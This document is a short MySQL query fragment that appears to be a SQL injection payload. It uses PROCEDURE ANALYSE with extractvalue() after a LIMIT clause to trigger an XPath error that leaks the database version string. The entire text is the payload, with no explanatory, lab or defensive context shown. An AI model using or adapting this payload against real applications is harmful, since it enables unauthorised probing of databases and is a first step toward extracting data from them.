SELECT field 
FROM user 
WHERE id > 0 
ORDER BY id 
LIMIT 1, 1 
procedure analyse(
    extractvalue(
        rand(), concat(0x3a, version())
    ), 1
);